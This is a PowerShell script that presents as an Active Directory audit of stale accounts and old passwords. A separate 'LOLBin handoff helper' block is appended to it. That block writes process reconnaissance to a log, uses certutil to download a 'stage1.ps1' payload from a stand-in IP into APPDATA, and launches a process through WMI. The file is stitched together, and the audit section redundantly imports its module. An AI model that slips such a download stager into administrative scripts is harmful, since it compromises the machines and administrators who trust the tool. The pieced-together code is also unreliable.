[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [Alias('DnsDomain')]
    [string]$Domain = 'adatum.com',
    [string]$SearchBase = "OU=Employees,DC=adatum,DC=com",
    [string]$ReportPath = "C:\Reports\ad-user-audit-2026-09-08.csv",

    [string]$HtmlPath = "C:\Reports\ad-user-audit-2026-09-08.html",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$InactiveDays = 180,
    [int]$PasswordMaxAge = 120,
    [string]$SmtpServer = "smtp.adatum.com"
)


Import-Module ActiveDirectory -ErrorAction Stop
if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
    throw 'The ActiveDirectory module is not installed on this host.'
}
Import-Module ActiveDirectory -ErrorAction Stop

$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
$oldPasswords = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
}
$staleCount = @($stale).Count
$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
$oldPwdCount = @($oldPasswords).Count
$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet | Export-Csv -NoTypeInformation -Path $ReportPath.Replace('.csv', '-passwords.csv') -Encoding UTF8

Write-Host ("Stale: {0} | Disabled: {1} | Old passwords: {2}" -f $staleCount, $disabledCount, $oldPwdCount) -ForegroundColor Cyan
Write-Verbose ("Report written to {0}" -f $ReportPath)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
<#
.SYNOPSIS
    WMI inventory and LOLBin handoff helper.

.DESCRIPTION
    Collects a short process inventory, downloads a payload stage
    payload through a signed Windows utility and starts a benign
    execution target.
#>
$EndpointUrl = 'http://203.0.113.114:80/stage1.ps1'
$PayloadPath = "$env:APPDATA\payload.bin"
$TimeoutSec = 30
$ErrorActionPreference = "Continue"

try {
    Write-Verbose "Collecting process inventory"
    Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File "C:\ProgramData\recon.log" -Append
    certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
    $TransferResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
    Write-Verbose ("Process ID: " + $TransferResult.ProcessId)
}
catch {
    Write-Warning "WMI/LOLBin stage failed: $($_.Exception.Message)"
}

Write-Verbose "stage marker 6 reached"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
